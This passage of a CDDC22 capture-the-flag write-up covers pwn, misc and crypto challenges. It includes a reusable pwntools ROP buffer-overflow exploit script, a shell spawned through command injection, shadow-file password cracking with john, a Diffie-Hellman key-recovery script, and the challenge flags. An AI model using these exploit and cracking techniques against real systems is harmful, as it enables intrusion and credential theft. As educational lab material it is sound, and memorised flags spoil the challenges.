![image](https://user-images.githubusercontent.com/68913871/175265981-77305503-7401-4cf8-abd8-148f411632da.png)

> The workaround is to spawn another shell using `system("sh")` and then we are free to type in anything without being restricted by 4 characters anymore.

![image](https://user-images.githubusercontent.com/68913871/175266247-5fdb2c30-58ea-4660-ac8e-75434704aa86.png)

`CDDC22{H3h3_1nject1ng_c0Mmand_Fun~!}` [Go to Top](#CDDC22) ⬆️

### Simple BOF

![image](https://user-images.githubusercontent.com/68913871/175266400-ef3fcd10-1016-482c-a75f-855826e55047.png)

> This is a generic buffer overflow challenge where we need to control the RIP to execute a function. [Read here](https://github.com/Rookie441/CTF/blob/main/CTFs/BCACTF3.0_Writeup.md#jump-rope) for my previous writeup on such challenges.

> Because this challenge is very common in CTFs, I made an automated solver `ropstar.py` which I modified from [CryptoCat's Github](https://github.com/Crypto-Cat/CTF/blob/main/pwn/binary_exploitation_101/). We just need to change the parameters under `CHANGE THIS` and run the script to get our flag.

```python
from pwn import *

#                    CHANGE THIS
# ===========================================================
prompt = b":"	            # Char prompt for user input
exe = './overwriteme'       # Name of binary file

def rop_exploit():	    # Name of win function + argument(s) in brackets (separate with commas)
    rop.printflag()


# Optional parameters
cyclic_size = 200           # Change if buffer size is large
save_payload = False	    # Set True to save payload into a file
show_checksec = False	    # Set True to see security info
context.log_level = 'info'  # info/debug/error/warning
# ===========================================================

# Set up pwntools for the correct architecture
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=show_checksec)

# Allows easy swapping betwen local/remote
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset of Instruction Pointer
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(prompt, payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    if context.bits == 32:
        ip_offset = cyclic_find(p.corefile.pc)  # x86
    elif context.bits == 64:
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(cyclic_size))

# Start program
io = start()

# ROP object
rop = ROP(elf)
rop_exploit()

# Build the payload
payload = flat({
    offset: rop.chain()
})

# Save the payload to file
if save_payload:
    write('payload', payload)

# Send the payload
io.sendlineafter(prompt, payload)

# Get flag
io.interactive()
```

![image](https://user-images.githubusercontent.com/68913871/175266452-9fdc7a45-1cde-48fe-8a86-158b41f71599.png)

`CDDC22{Funct10n_4ddress_Overw1ted_@H_!}` [Go to Top](#CDDC22) ⬆️

### Uninitialized

![image](https://user-images.githubusercontent.com/68913871/175270815-54f902d3-3369-42e3-9df8-0c3ffd30f537.png)

> Analyze the ELF binary using [Ghidra](https://ghidra-sre.org/) to get the following decompiled code

```C
undefined8 main(void)

{
  undefined4 uVar1;
  int local_c;

  setvbuf(stdout,(char *)0x0,1,0);
  setvbuf(stdin,(char *)0x0,1,0);
  puts("\n--------------------------------------------");
  puts("Flag Printing Service ");
  puts("--------------------------------------------\n");
  local_c = 0;
  while (local_c < 10) {
    uVar1 = print_menu();
    switch(uVar1) {
    case 1:
      print_menu();
      break;
    case 2:
      login();
      break;
    case 3:
      print_flag();
      break;
    case 4:
      print_name();
      break;
    case 5:
      puts("Good bye!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    local_c = local_c + 1;
  }
  return 0;
}
```

```C
uint print_menu(void)

{
  uint local_c;

  puts("[Service menu]\n\t1) Show menu\n\t2) login\n\t3) print flag\n\t4) print name\n\t5) logout");
  printf("\nselect : ");
  __isoc99_scanf(&DAT_00400d6b,&local_c);
  printf("\n\tYou select [%d]\n\n",(ulong)local_c);
  fgetc(stdin);
  return local_c;
}
```

```C
void login(void)

{
  int iVar1;
  char local_28 [32];

  printf("Key : ");
  fflush(stdout);
  read(0,local_28,0x20);
  iVar1 = strncmp(local_28,"weakpass",8);
  if (iVar1 != 0) {
    puts("Login FAILED!!");
  }
  else {
    puts("Login Successful!");
  }
  login_s = (uint)(iVar1 == 0);
  return;
}
```

> We can observe that the required key for login is `weakpass` and if successful, `login_s` will be set to 1.

```C
void print_flag(void)

{
  undefined local_418 [1032];
  FILE *local_10;

  local_10 = fopen("flag","rb");
  if (local_10 == (FILE *)0x0) {
    perror("[-] flag file ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fread(local_418,0x400,1,local_10);
  puts("[-] Not Implemented!");
  fclose(local_10);
  return;
}
```

> We can see that running the `print_flag()` function stores the contents of the flag to `local_418`

```C
void print_name(void)

{
  char local_418 [1036];
  undefined4 local_c;

  local_c = 0;
  if (login_s == 1) {
    printf("name = %s\n",local_418);
  }
  else {
    strncpy(local_418,"",0x400);
    puts("[-] Not login");
  }
  return;
}
```

> We can see that if `login_s` is 1, which is obtained by successful login, the contents of `local_418`, which is that of the flag, will be printed.

> In summary, we need to do the following in order:

```
login() with key "weakpass" --> login_s = 1
print_flag() --> flag contents stored in local_418
print_name() --> login_s == 1, local_418 contains the contents, FLAG PRINTED
```

![image](https://user-images.githubusercontent.com/68913871/175277021-10849e91-9365-413d-9662-fa56f10a9129.png)

`CDDC22{Un1nitialz1ed_Var14ble_Fun_4nd_Pr0fit~!}` [Go to Top](#CDDC22) ⬆️

## Misc

### go n c

![image](https://user-images.githubusercontent.com/68913871/175277246-014cc8ad-5ff6-4d1b-a812-645073d0039f.png)

> Use netcat to connect to the specified server and port

![image](https://user-images.githubusercontent.com/68913871/175277266-47868429-5ca7-4fea-ab6a-2784a2965df7.png)

`CDDC22{S1mp1e_Ch4113ng3_just_G0_4nd_S33}` [Go to Top](#CDDC22) ⬆️

### Invisible morse

![image](https://user-images.githubusercontent.com/68913871/175277658-3309edc3-6598-4fda-9925-257503d5212a.png)

> Given text file seems empty but we can select all to see that there are invisible characters

![image](https://user-images.githubusercontent.com/68913871/175277644-b95a68f8-ad48-4fb1-ba2f-48f4a89427f0.png)

> This can be better visualized in a hexeditor.

![image](https://user-images.githubusercontent.com/68913871/175277902-402df5cd-67b2-478d-9382-43e8332c17a2.png)

> We can copy into notepad++ and replace `0A` with spaces, `20` with `.` and `09` with `-` to get the following:

```
.-.. .---- ... - . -. -....- - ----- -....- - .... . -....- -- ----- .-. ... . -....- -.-. ----- -.. ...-- -....- .--. .-.. . ....- ... .
```

> Use [morse decoder](https://morsedecoder.com/) to get the flag

![image](https://user-images.githubusercontent.com/68913871/175278813-3e08c431-7c47-4d52-841c-f5f17428cb70.png)

`CDDC22{L1STEN-T0-THE-M0RSE-C0D3-PLE4SE}` [Go to Top](#CDDC22) ⬆️

### Copy n Paste

![image](https://user-images.githubusercontent.com/68913871/175279044-81609641-cdc9-46a4-a7b6-5e242c62be39.png)

> Select and Copy everything in the animation then base64 decode after `$ python3 echo.py flag.png` and before `$ Done :)` We get a png file which can be rendered in CyberChef as well to give us the flag.

![image](https://user-images.githubusercontent.com/68913871/175279974-be44b4ce-3cc7-491d-bebf-b70d76dc91d8.png)

`CDDC22{S4V4G3_LOVE}` [Go to Top](#CDDC22) ⬆️

### PPS

![image](https://user-images.githubusercontent.com/68913871/175280105-f5b55e50-4313-4441-b223-8976d26e0d6d.png)

> This challenge involves the use of [DTMF tones](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling) which can be decoded using [this online tool](http://dialabc.com/sound/detect/index.html) However, note that we first have to convert to a supported format such as .wav

![image](https://user-images.githubusercontent.com/68913871/175281011-cb31d69c-97a4-47bf-9d3e-8d553c6355de.png)

> Something went wrong because we were expecting 8 digits. 1 digit is missing.

> Hence, try a different tool such as [this one](https://github.com/ribt/dtmf-decoder) from Github.

![image](https://user-images.githubusercontent.com/68913871/175281238-2ca405ca-1e35-46c2-a89a-34dc52f85e59.png)

`CDDC22{*38492751#}` [Go to Top](#CDDC22) ⬆️

### Hash Attack

![image](https://user-images.githubusercontent.com/68913871/175281594-83f56fef-bd1e-4d84-a9df-7b2cfa4e6c40.png)

> The contents of the file is as follows:

```
de7d1b721a1e0632b7cf04edf5032c8ecffa9f9a08492152b926f1a5a7e765d7bc16f5825a9dafc8c245dc7cd93f4e671a9885035a73e6ef29c04f2d3863bfab1c6333509debf060200eb6bbe28db307508da67c0e3c58088393e4cf09de596dbb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87ed5eb9a37e2d8231af3388319b941995f6dc8755c56043d0cc52b5fe405a87deb9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f66e0325c66f79b23b40bd426545749be8d2380bcf1ce38fe4a3c324038144f4b2021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d966b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4bd2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde9f4024faec10ef6d29aa32d7935d94b1a816fd4fe0359fbf12d49d44b5ff33b8d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fdebb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde187897ce0afcf20b50ba2b37dca84a951b7046f29ed5ab94f010619f69d6e189d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde7383711c1b05e72a1eddda46d34365edf3736a7c23806ab39b9e6f403c9dd625d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde63212655f2e25a8f89eeb6653853cece8901e24c4a4c1dee70e53b68bad3e19cbb7208bc9b5d7c04f1236a82a0093a5e33f40423d5ba8d4266f7092c3ba43b62d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2
```

> We can note that there is no such hash output that is so huge. So let's try to splice it to different lengths such as 32-bit and 64-bit. After some trial and error, we found it to be 64-bit SHA256 hash.

> We can then write the following python script

```python
hashed = "de7d1b721a1e0632b7cf04edf5032c8ecffa9f9a08492152b926f1a5a7e765d7bc16f5825a9dafc8c245dc7cd93f4e671a9885035a73e6ef29c04f2d3863bfab1c6333509debf060200eb6bbe28db307508da67c0e3c58088393e4cf09de596dbb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87ed5eb9a37e2d8231af3388319b941995f6dc8755c56043d0cc52b5fe405a87deb9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f66e0325c66f79b23b40bd426545749be8d2380bcf1ce38fe4a3c324038144f4b2021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d966b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4bd2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde9f4024faec10ef6d29aa32d7935d94b1a816fd4fe0359fbf12d49d44b5ff33b8d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fdebb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde187897ce0afcf20b50ba2b37dca84a951b7046f29ed5ab94f010619f69d6e189d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde7383711c1b05e72a1eddda46d34365edf3736a7c23806ab39b9e6f403c9dd625d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde63212655f2e25a8f89eeb6653853cece8901e24c4a4c1dee70e53b68bad3e19cbb7208bc9b5d7c04f1236a82a0093a5e33f40423d5ba8d4266f7092c3ba43b62d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2"

for i in range(0,len(hashed),64):
    print(hashed[i:i+64])
```

> This is the output :

```
de7d1b721a1e0632b7cf04edf5032c8ecffa9f9a08492152b926f1a5a7e765d7
bc16f5825a9dafc8c245dc7cd93f4e671a9885035a73e6ef29c04f2d3863bfab
1c6333509debf060200eb6bbe28db307508da67c0e3c58088393e4cf09de596d
bb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87
ed5eb9a37e2d8231af3388319b941995f6dc8755c56043d0cc52b5fe405a87de
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
6e0325c66f79b23b40bd426545749be8d2380bcf1ce38fe4a3c324038144f4b2
021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
9f4024faec10ef6d29aa32d7935d94b1a816fd4fe0359fbf12d49d44b5ff33b8
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
bb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
187897ce0afcf20b50ba2b37dca84a951b7046f29ed5ab94f010619f69d6e189
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
7383711c1b05e72a1eddda46d34365edf3736a7c23806ab39b9e6f403c9dd625
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
63212655f2e25a8f89eeb6653853cece8901e24c4a4c1dee70e53b68bad3e19c
bb7208bc9b5d7c04f1236a82a0093a5e33f40423d5ba8d4266f7092c3ba43b62
d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2
```

> Now, proceed to [CrackStation](https://crackstation.net/) to reverse the hash. Note that the online tool only allows up to 20 hashes at one time.

![image](https://user-images.githubusercontent.com/68913871/175286886-44d660b0-4cd3-4b64-af43-2ced283b256e.png)

> There is 1 unknown hash but we can easily assume it to be `CDDC22` to suit the flag format. We can verify this by encrypting `CDDC22` with SHA256 and see that the hash matches.

![image](https://user-images.githubusercontent.com/68913871/175287159-a970c047-e7e4-43c5-8546-23cf9496e46b.png)

`CDDC22{1_Love_you_more_than_ever!}` [Go to Top](#CDDC22) ⬆️

### Crack the password

![image](https://user-images.githubusercontent.com/68913871/175287230-ec9da9cf-e10d-4e83-bda3-a2f772db43bf.png)

> This is the contents of print_flag.py

```python
import pyminizip
import sys

passwd = raw_input("What is user's password?")
passwd += raw_input("What is service's password?")
passwd += raw_input("What is sys's password?")
passwd += raw_input("What is root's password?")
passwd += raw_input("What is bin's password?")
passwd += raw_input("What is backup's password?")
passwd += raw_input("What is daemon's password?")

#d print "password : ", passwd
pyminizip.uncompress("flag.zip", passwd, "out", 0)
print open("flag").read()
```

> We are also given a shadow file which is often found in `/etc/shadow` which contains every user's encrypted password. Read more [here](https://linuxize.com/post/etc-shadow-file/)

```
backup:$1$AW3PeKjo$6X6LFreZoSWnuK8YMSaYU1:14684:0:99999:7:::
bin:$1$uaXtYDCA$UuZ6hrSCcTYGUqXGrRyqf/:14684:0:99999:7:::
daemon:$1$iAJ/Oj7a$QfzzGrDS3zCmvZjjnYb4q0:14684:0:99999:7:::
root:$1$VFX2fSJL$qOtnkgZY1.JwTYHXwJbAO0:14747:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
```

> If the passwords are not strong, we can easily crack them with `john`.

![image](https://user-images.githubusercontent.com/68913871/175288201-427f17ef-f626-4e60-a074-9f55029cd1bb.png)

> Proceed to append the passwords in the correct order to get `passwd` as shown in the above python file.

```
userservicebatmanlovevictorybutterflyred
```

> Open the encrypted zip file with the given password to get the flag

`CDDC22{Dump3d_f1lesyst3m_4nd_sh4dow_f1le~}` [Go to Top](#CDDC22) ⬆️

## Crypto

### Vigenere

![image](https://user-images.githubusercontent.com/68913871/175288864-0e7e1a7f-5e34-47dd-8e63-7562cb901d96.png)

> The contents of the file is:

```
ns wyy ixsu kfmex rri tskcxipo tycwuyvb? sj wyy ukrr ds eox y ppyq, cme rcoh ry olya ylssd zgqilovc. ppyq mq MHBM22{z3pi_wgwtjo_4rb_34cc_abcnd0_gf4vpcxkc}
```

> As the name of the challenge suggest, this is a Vigenere cipher which can be decoded [here](https://www.guballa.de/vigenere-solver) by brute forcing the key.

![image](https://user-images.githubusercontent.com/68913871/175289213-d5af68e2-9c17-434c-b2e7-1a59ac4a3794.png)

> As seen, the key is found to be `key` and we get our plaintext flag.

`CDDC22{v3ry_simple_4nd_34sy_crypt0_ch4llenge}` [Go to Top](#CDDC22) ⬆️

### Diffie-Hellman

![image](https://user-images.githubusercontent.com/68913871/175288876-cb9bb875-0475-42e9-80c3-fa2befac08ef.png)

> This challenge was done by Elvis. This is his writeup:

> First we unzip the `dh_server` zip file that is provided and we find a log file:

```
[+] Prime: 0xf9aecd571c9afadaceae0004000c64fceb6720f717756dab1f12b2ed7fd211a13024735efeb80a8f7982a0787d4a2eb866b18b8e7d62f2b92f6bd0d7ca52b2cd18e7b508d1af3c69eee907ab9bde2cca7f6cea613954d98a3f8e0c52761937636afb2b6776ac7f4ac02af12e72f4f4905dbeac3e4e856c8542bbda24106161d9
[+] Server Key: 0xf081ffd7fade2b78fc3e3182c50ca1067c9aeecdfd1484fd842bf0821f5efaa091f55a82313f693cdd8a4c65e1c876cfa68ba6980f4788cb5a9ba845469cd2f3d4b94281a3ad426c6092d8cf1de9368992d05c319b45a9a867788ad877a90862446d67a397f30ba91b9df06447b823be8e2c0bba998f548888f638401931ad99
[+] Please give me your key :
>> 101752188851588702786663864886064578902654651951985866839003796634186954471878272123772894282171928731095228234190527287304860559135921159182420718259970442394992811637314757293507073993913485850566751318782466533493182193918336800513466736844109978537994535285068729297204514757610248021028835645897421370304
[+] This encrypted flag : 8fceb2a29cc2d7abd8ecfc8da5dc1eea6f67f7a0b047749d66ef8886bb33c720dfc5dd4e508bd1e4a811c62b83f98e65
privkey leaked : 0x3e1591ea4e4eef19c99626ab1d15d442becbbd2b7d7a4150ee8f1af3f0adf9df47a53823ddfe83c6a7fa4b1b5dfa319021b26dec15c385d3869c7a7ce039b8519318563602d846ea242550bbac73dfc20a27c19b119820e45589cc6f54e9bafc50befbe222aa2738a35f5fca17ca7eec71ce24449ed21fd46b92ca11080001__
```

> We can obtain the `prime p`, `server public key x`, `myKey y`, `encrypted flag` and `server private key a` from the log file.

> Other than this log file we find a `DH.py`

```python
#!/usr/bin/python3
from Crypto.Util.number import getPrime
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
import hashlib
import random

class DH(object):
    def __init__(self, p):
        self.p = p
        self.g = 2
        self.privkey = random.randint(2, self.p - 1)

    def get_pubkey(self):
        self.k = pow(self.g, self.privkey, self.p)
        return self.k

    def set_shared_key(self, k):
        self.sk = pow(k, self.privkey, self.p)
        aes_key = hashlib.md5(str(self.sk).encode()).digest()
        self.cipher = AES.new(aes_key, AES.MODE_ECB)

    def encrypt(self, pt):
        return self.cipher.encrypt(pad(pt, 16)).hex()

    def decrypt(self, ct):
        return unpad(self.cipher.decrypt(bytes.fromhex(ct)), 16)

    def leak_privkey(self):
        print (f"privkey leaked : {self.privkey:#x}")
```

> We also have `server.py`:

```python
#!/usr/bin/python3
from DH import *

flag = open("flag", "r").read().encode()
prime = getPrime(1024)
print(f"[+] Prime: {hex(prime)}")
server = DH(prime)

server_k = server.get_pubkey()
print(f"[+] Server Key: {hex(server_k)}")
print("[+] Please give me your key :")

# ----------------------------
# receive client public key  
client_k = int(input(">> "))
#
# ----------------------------

server.set_shared_key(client_k)
print(f"[+] This encrypted flag : {server.encrypt(flag)}")
server.leak_privkey()
```

> From here we can see that the `DH.py` file contains a class that carries out all the Diffie-Hellman stuff, and the `server.py` file makes use of the `DH.py` file to do things, and that `server.py` is the python file which was ran to encrypt the flag.

> Hence I created another python script that makes use of the info found in the log file to decrypt the flag.

![image](https://user-images.githubusercontent.com/68913871/175347185-14223a98-2606-4431-8ccd-b90bce1726c7.png)

> First I process all the hex numbers into integers. Notice that inside the log file, at the back of the leaked private key, there are 2 underscores.

![image](https://user-images.githubusercontent.com/68913871/175347234-440f0e6d-d4b2-44fd-bc8d-9fe3bbba7821.png)

> After a while of trying things, eventually we figured out that the underscores means that any 2 hex characters could be in that position. The second part of the script deals with this by iterating through all 255 possibilities (from 00 to FF) and appends it to the back of the private key.

> Next, at line 33 I calculate the value of the key by using the formula:
`Key – k = [keyFromClient – y] ^ [serverPrivateKey – a] mod [prime p]`
It is done using python’s pow function (3rd parameter takes in modulo)

> Next I create the AES Cipher using ECB mode in the same way as in the `DH.py` file and try to decrypt the encrypted flag and unpad it. It is in a try block so that the script will continue running even if unpad fails.

![image](https://user-images.githubusercontent.com/68913871/175347308-8d2f1e83-10d2-4fdf-8964-bd655751b9da.png)

> After that I print the result if unpadding succeeds to see if it is the flag. Out of all 255 possibilities, only 1 unpadded correctly and it is the flag.

![image](https://user-images.githubusercontent.com/68913871/175347375-30ade072-165d-4746-833b-65b4938a2469.png)

> Final script:

```python
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
import hashlib
import math

primeHex = "0xf9aecd571c9afadaceae0004000c64fceb6720f717756dab1f12b2ed7fd211a13024735efeb80a8f7982a0787d4a2eb866b18b8e7d62f2b92f6bd0d7ca52b2cd18e7b508d1af3c69eee907ab9bde2cca7f6cea613954d98a3f8e0c52761937636afb2b6776ac7f4ac02af12e72f4f4905dbeac3e4e856c8542bbda24106161d9"

serverKey = "0xf081ffd7fade2b78fc3e3182c50ca1067c9aeecdfd1484fd842bf0821f5efaa091f55a82313f693cdd8a4c65e1c876cfa68ba6980f4788cb5a9ba845469cd2f3d4b94281a3ad426c6092d8cf1de9368992d05c319b45a9a867788ad877a90862446d67a397f30ba91b9df06447b823be8e2c0bba998f548888f638401931ad99"

myKey = 101752188851588702786663864886064578902654651951985866839003796634186954471878272123772894282171928731095228234190527287304860559135921159182420718259970442394992811637314757293507073993913485850566751318782466533493182193918336800513466736844109978537994535285068729297204514757610248021028835645897421370304

encFlag = "0x8fceb2a29cc2d7abd8ecfc8da5dc1eea6f67f7a0b047749d66ef8886bb33c720dfc5dd4e508bd1e4a811c62b83f98e65"

privateKeyLeaked = "0x3e1591ea4e4eef19c99626ab1d15d442becbbd2b7d7a4150ee8f1af3f0adf9df47a53823ddfe83c6a7fa4b1b5dfa319021b26dec15c385d3869c7a7ce039b8519318563602d846ea242550bbac73dfc20a27c19b119820e45589cc6f54e9bafc50befbe222aa2738a35f5fca17ca7eec71ce24449ed21fd46b92ca11080001"



primeInt = int(primeHex, 0)
serverKeyInt = int(serverKey, 0)
encFlagInt = int(encFlag, 0)


for backPart in range(0, 255):

	hexstrToAdd = str(hex(backPart))[2:]

	if (backPart < 16):
		hexstrToAdd = "0" + hexstrToAdd

	privKeyAddedBack = privateKeyLeaked + hexstrToAdd
	privateKeyLeakedInt = int(privKeyAddedBack, 0)

	mySk = pow(myKey, privateKeyLeakedInt, primeInt)

	try:
		aesKey = hashlib.md5(str(mySk).encode()).digest()
		theCipher = AES.new(aesKey, AES.MODE_ECB)

		theBytes = bytes.fromhex(encFlag[2:])
		decrypted = theCipher.decrypt(theBytes)

		print(unpad(decrypted, 16).decode('utf-8'))
	except:
		pass
```

`CDDC22{D1ffi3_H3llm4n_k3y_3xch@ng3_D0ne!}`

## [Go to Top](#CDDC22)
